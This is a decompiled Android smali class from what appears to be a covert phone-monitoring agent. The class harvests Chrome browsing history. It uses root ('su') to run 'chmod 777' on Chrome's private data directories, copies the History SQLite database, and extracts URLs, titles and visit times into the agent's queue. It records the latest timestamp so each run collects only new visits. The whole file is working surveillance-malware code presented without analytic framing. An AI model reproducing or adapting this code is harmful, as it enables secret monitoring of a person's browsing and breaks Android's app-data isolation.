.class public Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;
.super Ljava/lang/Object;
.source "BrowserHistoryListerPostLollipop.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "BrowserHistoryListerPostLollipop"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "chrHistTmp"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserHistoryData;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 37
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 41
    iput-object p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->context:Lcom/hp/vd/context/Context;

    .line 42
    iput-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 43
    iput-object p3, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 44
    iput-object p4, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 3

    .line 311
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v1, "su"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 312
    new-instance v1, Ljava/io/DataOutputStream;

    invoke-virtual {v0}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 315
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 316
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "chmod -R 777 "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 319
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "chmod 777 "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\n"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 322
    :goto_0
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V

    const-string p1, "exit\n"

    .line 324
    invoke-virtual {v1, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 325
    invoke-virtual {v1}, Ljava/io/DataOutputStream;->flush()V

    .line 327
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    .line 335
    iget-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "BrowserHistoryListerPostLollipop"

    const-string v1, "chmod(): InterruptedException"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_1

    :catch_1
    move-exception p1

    .line 332
    iget-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "BrowserHistoryListerPostLollipop"

    const-string v1, "chmod(): IOException"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    const/4 p1, 0x0

    return p1
.end method

.method chromeTime(J)J
    .locals 4

    const-wide/16 v0, 0x3e8

    .line 298
    div-long/2addr p1, v0

    const-wide v0, 0xa9730b66800L

    sub-long v2, p1, v0

    return-wide v2
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 358
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 359
    new-instance v1, Lcom/hp/vd/module/monitor/browser/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/monitor/browser/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 361
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 362
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 366
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 343
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 344
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 346
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 347
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 349
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 351
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 352
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected extractHistory(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 11

    .line 158
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_history_date_chrome_root"

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->safeExtract(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    .line 164
    new-instance v1, Lcom/hp/vd/module/monitor/browser/BrowserHistoryColumns;

    invoke-direct {v1}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryColumns;-><init>()V

    :try_start_0
    const-string v2, "SELECT id, url, title, last_visit_time FROM urls WHERE last_visit_time > ? LIMIT ?"

    const/4 v3, 0x2

    .line 169
    new-array v4, v3, [Ljava/lang/String;

    const/4 v5, 0x0

    .line 172
    invoke-virtual {v0}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x1

    const-string v6, "500"

    aput-object v6, v4, v5

    .line 169
    invoke-virtual {p1, v2, v4}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 178
    iget-object p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "BrowserHistoryListerPostLollipop"

    const-string v1, "History Cursor is null."

    const/4 v2, 0x3

    invoke-interface {p1, v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_0
    move-object v2, v0

    .line 183
    :cond_1
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 184
    new-instance v4, Lcom/hp/vd/data/BrowserHistoryData;

    invoke-direct {v4}, Lcom/hp/vd/data/BrowserHistoryData;-><init>()V

    .line 186
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->source:Ljava/lang/Integer;

    .line 187
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "id"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->internalId:Ljava/lang/Integer;

    .line 189
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "url"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->url:Ljava/lang/String;

    .line 190
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "title"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/BrowserHistoryData;->title:Ljava/lang/String;

    .line 196
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "last_visit_time"

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {p1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v5

    .line 197
    invoke-virtual {p0, v5, v6}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->chromeTime(J)J

    move-result-wide v7

    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    .line 198
    new-instance v8, Ljava/util/Date;

    invoke-virtual {v7}, Ljava/lang/Long;->longValue()J

    move-result-wide v9

    invoke-direct {v8, v9, v10}, Ljava/util/Date;-><init>(J)V

    .line 200
    iput-object v8, v4, Lcom/hp/vd/data/BrowserHistoryData;->lastVisitOn:Ljava/util/Date;

    .line 206
    iget-object v7, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {v7, v4}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    .line 211
    invoke-virtual {v2}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    cmp-long v4, v5, v7

    if-lez v4, :cond_1

    .line 212
    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    goto :goto_0

    .line 216
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v0, v2, :cond_3

    .line 223
    iget-object p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_history_date_chrome_root"

    .line 225
    invoke-virtual {v2}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v1

    .line 223
    invoke-virtual {p1, v0, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 228
    iget-object p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 229
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v0}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_3
    return-void

    :catch_0
    move-exception p1

    .line 232
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v2, "Error extracting data."

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method

.method public isReadable(Ljava/lang/String;)Z
    .locals 1

    .line 303
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 305
    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 4

    const/4 v0, 0x0

    .line 247
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 262
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x10

    invoke-static {p1, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 265
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryListerPostLollipop"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 266
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v0

    :catch_1
    move-exception p1

    .line 250
    iget-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v2, "prepareDatabase(): Exception caught during coping database to a temporary location."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public run()V
    .locals 8

    const-string v0, "chrHistTmp"

    .line 54
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    const-string v0, "/data/data/com.android.chrome/app_chrome/Default/History"

    const/4 v1, 0x4

    .line 62
    new-array v1, v1, [Ljava/lang/String;

    const-string v2, "/data/data/com.android.chrome/"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "/data/data/com.android.chrome/app_chrome/"

    const/4 v4, 0x1

    aput-object v2, v1, v4

    const-string v2, "/data/data/com.android.chrome/app_chrome/Default/"

    const/4 v4, 0x2

    aput-object v2, v1, v4

    const/4 v2, 0x3

    aput-object v0, v1, v2

    .line 69
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->isReadable(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_1

    .line 70
    array-length v4, v1

    move v5, v3

    :goto_0
    if-ge v5, v4, :cond_1

    aget-object v6, v1, v5

    .line 71
    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->isReadable(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_0

    .line 72
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {p0, v6, v7}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    :cond_0
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 81
    :cond_1
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 83
    invoke-virtual {v1}, Ljava/io/File;->isFile()Z

    move-result v0

    if-nez v0, :cond_2

    .line 84
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v3, "History file is not a file."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 89
    :cond_2
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_3

    .line 90
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v3, "History file does not exist."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 95
    :cond_3
    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long v0, v3, v5

    if-nez v0, :cond_4

    .line 96
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v3, "History file is 0L long."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_4
    const/4 v0, 0x0

    :try_start_0
    const-string v3, "chrHistTmp"

    const-string v4, "db"

    .line 110
    iget-object v5, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->context:Lcom/hp/vd/context/Context;

    .line 113
    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v5

    .line 110
    invoke-static {v3, v4, v5}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v3, :cond_5

    .line 117
    :try_start_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v4, "Could not create the temporary database."

    invoke-interface {v0, v1, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :catch_0
    move-exception v0

    goto :goto_1

    .line 122
    :cond_5
    invoke-virtual {p0, v1, v3}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    if-nez v0, :cond_6

    .line 125
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "BrowserHistoryListerPostLollipop"

    const-string v4, "Could not open the temporary database."

    invoke-interface {v0, v1, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 127
    invoke-virtual {v3}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    .line 146
    :cond_6
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->extractHistory(Landroid/database/sqlite/SQLiteDatabase;)V

    if-eqz v0, :cond_7

    .line 149
    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_7
    if-eqz v3, :cond_8

    .line 152
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    :cond_8
    return-void

    :catch_1
    move-exception v1

    move-object v3, v0

    move-object v0, v1

    .line 133
    :goto_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "BrowserHistoryListerPostLollipop"

    const-string v4, "Exception caught during preparing the database for extraction."

    invoke-interface {v1, v2, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eqz v3, :cond_9

    .line 136
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    :cond_9
    return-void
.end method

.method protected safeExtract(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;
    .locals 2

    const-wide/16 v0, 0x0

    .line 276
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 277
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    .line 280
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    goto :goto_0

    .line 284
    :cond_0
    :try_start_0
    invoke-static {p1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide p1

    invoke-static {p1, p2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 287
    :catch_0
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object p1

    :goto_0
    return-object p1
.end method
